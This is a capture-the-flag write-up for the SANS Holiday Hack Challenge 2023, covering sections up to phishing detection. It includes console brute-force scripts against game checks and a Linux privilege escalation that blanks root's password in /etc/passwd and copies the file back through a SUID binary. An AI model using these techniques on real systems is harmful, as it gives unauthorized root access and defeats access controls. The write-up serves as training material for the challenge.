# SANS Holiday Hack Contest 2023

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/sans-banner.png)

**Character: RealCyberDude**

**Report by: [Kory Kliner](https://www.linkedin.com/in/kory-kliner-b2663451/)**

A more thorough report can be found at: **[https://fuzzykittens.github.io/holiday-hack-challenge-2023](https://fuzzykittens.github.io/holiday-hack-challenge-2023)**

## Table of Contents

1. [Orientation](./report.md#orientation-)
1. [Snowball Fight](./report.md#snowball-fight-)
1. [Linux 101](./report.md#linux-101-)
1. [Reportinator](./report.md#reportinator-)
1. [Azure 101](./report.md#azure-101-)
1. [Luggage Lock](./report.md#luggage-lock-)
1. [Linux PrivEsc](./report.md#linux-privesc-)
1. [Faster Lock Combination](./report.md#faster-lock-combination-)
1. [Game Cartridges: Vol 1](./report.md#game-cartridges-vol1-)
1. [Game Cartridges: Vol 2](./report.md#game-cartridges-vol2-)
1. [Game Cartridges: Vol 3](./report.md#game-cartridges-vol3-)
1. [Na'aN](./report.md#naan-)
1. [KQL Kraken Hunt](./report.md#kql-kraken-hunt-)
1. [Phish Detection Agency](./report.md#phish-detection-agency-)
1. [Hashcat](./report.md#hashcat-)
1. [Elf Hunt](./report.md#elf-hunt-)
1. [Certificate SSHenanigans](./report.md#certificate-sshenanigans-)
1. [The Captain's Comms](./report.md#captains-coms-)
1. [Active Directory](./report.md#active-directory-)
1. [Space Island Door Access Speaker](./report.md#door-access-speaker-)
1. [Camera Access](./report.md#camera-access-)
1. [Missile Diversion](./report.md#missile-diversion-)
1. [Bonus! Fishing Mastery](./report.md#bonus-fishing-mastery-)
<!-- report-keep -->

## orientation <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.

<!-- report-keep -->

### Approach

Straight forward - for the orientation, simply enter answer after clicking on the terminal:

```console
Welcome to the first terminal challenge!

This one is intentionally simple. All we need you to do is:

- Click in the upper pane of this terminal
- Type answer and press enter

elf@53d3586a6ela:~$
```

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/orientation-1.png)

---

<!-- report-keep -->

## snowball-fight <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!

<!-- report-keep -->

### Approach

For this one, I started a random match making game, right-clicked on the game and started messing with the javascript vars in the console:

```console
player.health = 50000000000000
elfThrowDelay = 1000000000
santaThrowDelay = 1000000000
santaObject.health = 0
santaObject.name = 'Getting defeated'
```

### Resources

[select the right context](https://gist.github.com/chrisjd20/93771da596ca5e49043f148a845c469f)

---

<!-- report-keep -->

## linux-101 <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Visit Ginger Breddie in Santa's Shack on Chrismas
Island to help him with some basic Linux tasks.
This is a simple linux familiarization of commands. Follow the
prompts to enter several linux commands successfully.

<!-- report-keep -->

### Approach

Straight forward - enter the correct command. Use **hintme** if
you need a hint.

```console
ls
cat
rm
pwd
ls -a
history
printenv
grep -iR "troll" .
find . -type f -exec file {} \; | grep ELF
chmod u+x present_engine
./present_engine
mv blown_fuse0 fuse0
ln -s fuse0 fuse1
cp fuse1 fuse2
echo "TROLL_REPELLENT" >> fuse2
find /opt/troll_den -iname '*troll*'
find /opt/troll_den -user troll
find /opt/troll_den -size +108k -size -110k
ps -e
netstat -napt
curl 0.0.0.0:54321
kill 5444
```

---

<!-- report-keep -->

## reportinator <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Noel Boetie used ChatNPT to write a pentest report. He needs help
to understand which report findings are legitimate and which are
hallucinations. Read through the report carefully and select
either legitimate finding or hallucinated finding for each report
element.

<!-- report-keep -->

### Approach

For the approach, I spent some cycles reading through the report,
running the report through chat GPT and Bing chat enterprise, but
found a brute force approach will be most efficient. The application
uses client side java to interact with 9 report findings and post
the values to /check, so there is an opportunity to inject some
code into the console and brute force until we get a successful
response. With only 9 binary report findings, there is a total
of 9 bits we need to iterate through which means we only need to
iterate through a total of 512 combinations max.

To begin, I modified the main.js file slightly to stop having to
click on an alert every time an iteration fails, and creating a
new var "error" to establish something to stop iterating if we
find a successful combination of values.

Existing code in **main.js** (starting at line 83):

```javascript
                .then(data => {
                    if (data.error && data.error === 'FAILURE') {
                        alert("Failure, please try again.");
                    } else {
                        updateWebContent();
                        __POST_RESULTS__(data);
                    }
```

Modified code:

```javascript
                .then(data => {
                    if (data.error && data.error === 'FAILURE') {
                        //alert("Failure, please try again.");
                    } else {
                        updateWebContent();
                        __POST_RESULTS__(data);
                        var error = false; //to check during our iterations if we found the answer
                    }
```

Next, I created some helper functions to get us through modifying
the values on the html document elements. This is the code you
will want to run through the console.

```javascript
//create a change selection function which takes an int and creates a binary array and uses that to make a selection array
function changeSelections(iter) {
    var selection = iter.toString(2).split('');
    for (let i = 0; i < 9; i++) {
        if (selection[i] == undefined) {
        selection.unshift('0');
        }
    }
    //now that selection is fully populated, we must iterate through one more time to change all the values on the html document
    for (let i = 0; i < 9; i++) {
      var inputNum = i+1;
      document.getElementById('input-'+inputNum).value = selection[i];
    }
    console.log(selection);
    document.getElementsByClassName("submit-button")[0].click();
};

//delay iterations while we wait for post response
function loop() { 
    setTimeout(function() {
        changeSelections(iteration);
        console.log(iteration);
        iteration ++;
        if (iteration < 512 && error) {
            loop();
        }
    }, 1000);
};

var iteration = 0;
var error = true;

loop();
```

Running the above code in the console successfully finds a
binary combination at iteration 73 of 001001001.  A value
of 0 means finding is legit and value of 1 means finding
is a hallucination so the following is the answer:

1. Legit
1. Legit
1. Hallucination
1. Legit
1. Legit
1. Hallucination
1. Legit
1. Legit
1. Hallucination

---

<!-- report-keep -->

## azure-101 <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.

<!-- report-keep -->

### Approach

Straight forward - enter the commands when prompted:

```console
az help | less
az account show
az group list
az functionapp list --resource-group northpole-rg1
az vm list --resource-group northpole-rg2
az vm run-command invoke --resource-group northpole-rg2 --name NP-VM1 --command-id RunShellScript --scripts "ls -l"
```

### Resources

[Azure CLI Reference](https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest)

---

<!-- report-keep -->

## luggage-lock <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials

<!-- report-keep -->

### Useful AI Prompts

- How do I introduce a delay in a javascript loop?

### Approach

Simple approach - watch the talk above and put pressure on the latch and move the rollers until there is resistance.

### Alternate approach

As an alternate approach, I could use the websocket to emit messages until the lock opens, but for fun let's just play with the existing functions and watch the lock spin and open.

Simply start the game with four wheels.

<!-- report-keep -->

Right click on the combination and click inspect:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/luggagelock-2.png)

In the developer tools, enter the following javascript into the console and sit back and relax!

```javascript
function loop() {
  setTimeout(function() {
    attemptOpen();
    if (win === false) {
      if (dials[0].value == 9) {
        if (dials[1].value == 9) {
          if (dials[2].value == 9) {
            incWheel(3);
          }
        incWheel(2);
        }
      incWheel(1);
      }
    incWheel(0);
    loop();
    }
  }, 10);
};

loop();
```

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/luggagelock-3.png)

<!-- report-keep -->

### Resources

[Chris Elgee's talk](https://youtu.be/ycM1hBSEyog)

---

<!-- report-keep -->

## linux-privesc <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Rose mold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

<!-- report-keep -->

### Approach

For this approach, I first went through the normal Linux survey commands upon connection. Nothing really stood out, so I began looking for exploits related to the Linux distro which is Linux 3a7ac2253603 5.10.0-26-cloud-amd64.
Looking for exploits, there were some viable ones, but they would have taken some work. I spent some time reviewing [this](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/). I then pivoted to looking for a way to exploit SUID executables,
and found the following:

```console
elf@408ce566d9d0:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

At first, I went down some rabbit holes trying to think of a way to exploit one of those executables, so I went on to other challenges. I then had an epiphany - what if I grabbed the /etc/passwd file, copied it, modified the copied version so root doesn't use /etc/shadow/ and then used simplecopy to copy it back to /etc/passwd?

Exploit:

```console
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *

elf@ff34bc1d8894:~$ pwd
/home/elf
elf@ff34bc1d8894:~$ ls
HELP
elf@ff34bc1d8894:~$ cp /etc/passwd passwdcopy
elf@ff34bc1d8894:~$ sed -i 's;root:x:0:0:root:/root:/bin/bash;root::0:0:root:/root:/bin/bash;g' passwdcopy
elf@ff34bc1d8894:~$ /usr/bin/simplecopy passwdcopy /etc/passwd
elf@ff34bc1d8894:~$ su
root@ff34bc1d8894:/home/elf## cd /root
root@ff34bc1d8894:~## ls
runmetoanswer
root@ff34bc1d8894:~## ./runmetoanswer 
Who delivers Christmas presents?

> 
```

When you execute runmetoanswer, your answer is case sensitive :)

### Resources

[Linux Privilege Escalation](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/)

---

<!-- report-keep -->

## faster-lock-combination <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!

<!-- report-keep -->

### Approach

Spend a long time putting the correct pressure on a virtual Faster lock to open it, or mess with the javascript :)

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/fasterlock-1.png)

### Alternate approach

As an alternate approach, there are several ways you can interact with the javascript.  One simple approach is to simply right click on the lock, click inspect, and in the console type lock_numbers to get the output:

```json
{
    "first_number": 19,
    "second_number": 37,
    "third_number": 39,
    "bad_third_number": 19,
    "first_number_sticky": 14,
    "guess_number1": 9,
    "guess_number2": 4
}
```

Entering the combination 19-37-39:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/fasterlock-2.png)


---

<!-- report-keep -->

## game-cartridges-vol1 <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Find the first Gamegosling cartridge and beat the game

<!-- report-keep -->

### Approach

Once I found the game, a web link to it is added to my items. By going to the web link, I can actually capture the rom file.

I played the game by using the B key to fire musical notes into the blocks in the QR Code. When you do this to a block that is movable, it will play a song for a short period while highlighting where the block is supposed to be.

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game1-1.png)

I had to be careful pushing the blocks into place so I didn't get stuck in a position where I couldn't move another block into it's location, but in the end I was presented a QR Code that when scanned, gave me the message to solve the challenge.

The biggest challenge is solving the last block which had to be moved outside the QR code to the West and down around the south all the way east to it's position in the mid-east section.

After the last of the 7 blocks is in it's proper place, I was presented a QR code to scan and get the flag to solve the challenge:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game1-2.png)

[https://8bitelf.com](https://8bitelf.com)

flag:santaconfusedgivingplanetsqrcode

---

<!-- report-keep -->

## game-cartridges-vol2 <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Find the second Gamegosling cartridge and beat the game

<!-- report-keep -->

### Useful AI Prompts

- How do I compare two binary files in Windows?

### Approach

Looking at the conversations, it appears there is more than one version of this game. By refreshing the play on this multiple times, I was able to capture two .gb files: game0.gb and game1.gb.

Once I successfully acquired both roms using developer tools -> network, I used Windows FC command to compare the two:

```console
C:\>fc /B %USERPROFILE%\Documents\HolidayHackChallenge\vol2_game0_original.gb %USERPROFILE%\Documents\HolidayHackChallenge\vol2_game1_original.gb
Comparing files %USERPROFILE%\DOCUMENTS\HOLIDAYHACKCHALLENGE\vol2_game0_original.gb and %USERPROFILE%\DOCUMENTS\HOLIDAYHACKCHALLENGE\VOL2_GAME1_ORIGINAL.GB
0000014F: B3 86
00000593: 0B D2
00000594: 4B AC
00000595: 9A 3D
00000596: 23 2D
00016A84: 03 0B
00016AB8: 09 06
00017C80: 02 01
0001850E: 02 03
0001850F: 80 00
00018513: 0B 04
00018514: 80 00
```

I downloaded a couple of different emulators to play the games locally, and both games were similar but didn't have a way of getting anywhere in the game. So, I took an approach of modifying one of the games by trial and error just changing the differing values between both versions and then playing the modified game until I noticed something different in the game.

After making the following changes to game1.gb, I came upon a new item in the main room:

```
Location old new
00016AB8: 06 09
00017C80: 01 02
0001850E: 03 02
0001850F: 00 80
00018513: 04 0B
00018514: 00 80
```

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game2-1.png)

Once I hit the A button on the new item, I entered a room with a few more items:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game2-2.png)

When I went to the radio in the room and hit the A button on it, there was audio with what appeared to be morse code tones:

```
--. .-.. ----- .-. -.--
```

I had to listen to it a couple of times, but after noting down the tones and running them through an [Online Decoder](https://morsedecoder.com/), I got the message:

```
GL0RY
```

That's our answer - enter GL0RY into the challenge!

### Resources

[mGBA](https://mgba.io/)

[Morse Decoder](https://morsedecoder.com/)

---

<!-- report-keep -->

## game-cartridges-vol3 <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Find the third Gamegosling cartridge and beat the game

<!-- report-keep -->

### Useful AI Prompts

- What are the memory areas found in a GameBoy ROM?
- What emulators can monitor memory on GameBoy games?

### Approach

<!-- report-keep -->

I started by playing this game to understand what it entails. In this game, you collect coins by jumping into them.  The different levels have different values for the coins.  The first level starts with one of each, starting at 1, then 10 and finally 100. The subsequent levels have values of 1, 10 and 100 respectively.

<!-- report-keep -->

The interesting thing, is you never can get exactly 999 coins.  If you go over 999, you start back at 0.  If you land exactly on 999, you get Error: Unable to set 0xFE

<!-- report-keep -->

Once you make it to level 5, you run into NPC "Jared" who states "Back in my SysAdmin days, marketing always loved talking about [5] nines. But we all know it was more like [3] nines".

<!-- report-keep -->

Continuing on in level 5, you are presented an impossible jump that brings you back to the start of the game.

<!-- report-keep -->

Knowing from the clues this has something to do with getting 999 coins, it's time to do some investigating. [BGB GameBoy emulator](https://bgb.bircd.org/) has a great feature that allows you to monitor memory changes. Right clicking the emulator screen and selecting other -> cheat searcher brings up a memory searcher to search for specific values or even values that change/stay the same as the previous value.

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game3-6.png)

By playing around with this, collecting coins, searching for what changed in the cheat searcher and changing some of the values at those pointers, I was able to come to the conclusion:

```
ones:
C0F8=04(display value)   CBA2=04(actual value) 

tens:
C12C=04(display value)   CB9C=04(actual value)

hundreds:
C160=04(display value)   CB9E=04(actual value) 
```

By setting all the above to the value of 0x09, I finally both display 999 coins and actually have 999 coins. Interestingly, I also have some platforms that appear to help me get across the impossible jump:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game3-7.png)

By double-jumping on two different platforms, I am able to make it to the other side:

<!-- report-keep -->

From there, I get to the end of the level and enter a room. Talking to the "Grumpy Man" NPC in the room:

```
Grumpy Man: Who the heck are you?
Elf: I'm Elf the dwarf.
Grumpy Man: A dwarf named Elf? Well if that don't beat all. What are you doin' here?
Elf: I'm looking for Tom Liston.
Liston: Welp you've found him. I'm the hacker Tom Liston.
Elf: Blessed be! It's really you? I've searched for so long! I'm here to help you min crypto coins!
Liston: Well I hate to break it to you bud, but this 8-bit dimension will never allow you to collect enough coins.
I'm the dirtiest hacker around and even I can't figure it out. Which is too bad because I'm kinda stuck here.
Elf: If by "never" you mean I've filled my treasure pouch to the brim with coins, then yes, I agree!
I have "never" found this many crypto coins! GLOOOOOOOOOOORY!
*Elf shows Liston all his coins*
Liston: How in the world did you... never mind.
Say this passphrase "morethanmeetstheeye" to the ChatNPT thinger and then give it all your coins!
```

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game3-9.png)

Interacting with the other entity in the room:

```
ChatNPT: Analyzing... Passphrase correct! Coin total correct! setting variable ROCKCANMOVE = TRUE
```

<!-- report-keep -->

Interacting with rock in room:

```
Elf: I've RECEIVED... MUCH... GLOOOOOOOOOOOORY!
Liston: A drarf named Elf out hacked this old dirty hacker?
*Liston shakes his head & laughs*
Well if you can't beat'em, join'em.
GLOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOORY!
```

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/game3-11.png)

### Resources

[GB Dev](https://gbdev.io/)

[BGB](https://bgb.bircd.org/)

[Ghidra](https://github.com/NationalSecurityAgency/ghidra)

[GhidraBoy](https://github.com/Gekkio/GhidraBoy)

---

<!-- report-keep -->

## naan <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!

<!-- report-keep -->

### Useful AI Prompts

- Explain how python handles NaN

### Approach

Because Python is actually “duck typed”, and the inputs aren't properly validated in this Python game, there is a very simple solution to winning this card game:

0,1,8,9,NaN - always wins

### Resources

[Python NaN Injection](https://www.tenable.com/blog/python-nan-injection)

---

<!-- report-keep -->

## kql-kraken-hunt <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Use Azure Data Explorer to [uncover misdeeds](https://detective.kusto.io/sans2023) in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information/

<!-- report-keep -->

### Useful AI Prompts

- Give me an example KQL query.
- How do I decode base64 using Azure Data Explorer?

### Approach

Straight forward just brush up on KQL skills first:

Case 1:

```kql
Email
| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
| project recipient, sender, subject

"recipient": alabaster_snowball@santaworkshopgeeseislands.org,
"sender": cwombley@gmail.com,
"subject": [EXTERNAL] Invoice foir reindeer food past due
```

Case 2:

```kql
Email
| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
| join kind = inner Employees on $left.recipient == $right.email_addr
| project role, hostname, ip_addr

"role": Head Elf,
"hostname": Y1US-DESKTOP,
"ip_addr": 10.10.0.4
```

Case 3:

```kql
OutboundNetworkEvents
| join kind = inner Employees on $left.src_ip == $right.ip_addr
| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
| project timestamp

"timestamp": 2023-12-02T10:12:42Z
```

```kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= todatetime("2023-12-02T09:37:40Z")
| order by timestamp asc
| project path

"path": C:\ProgramData\Windows\Jolly\giftwrap.exe
```

Case 4:

```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= todatetime("2023-12-02T10:12:42Z")
| order by timestamp asc

This one takes a little detective work, but here is what I found:

113.37.9.17
2023-12-02T16:51:44Z
NorthPolefileshare
```

Case 5:

```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= todatetime("2023-12-02T10:12:42Z")
| order by timestamp asc

This one takes a little detective work, but here is what I found:

2023-12-24T16:07:47Z
NaughtyNiceList.txt
giftbox.com
```

Case 6:

```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= todatetime("2023-12-02T10:12:42Z")
| order by timestamp asc

This one takes a little detective work and pulling data out and examining it, but here is what I found:

downwithsanta.exe
--wipeall
```

Once Complete:

Once complete with all the cases, to get credit I need to enter the secret phrase:

```kql
print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
```

Which decodes to:

```kql
Beware the Cube that Wombles
```

### Resources

[Kusto SANS 2023](https://detective.kusto.io/sans2023)

---

<!-- report-keep -->

## phish-detection-agency <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!

<!-- report-keep -->

### Approach

This one is straight forward - I went through each of the 34 emails and look at the return-path, reply-to, and domain (d) to see if they match up.

---

<!-- report-keep -->

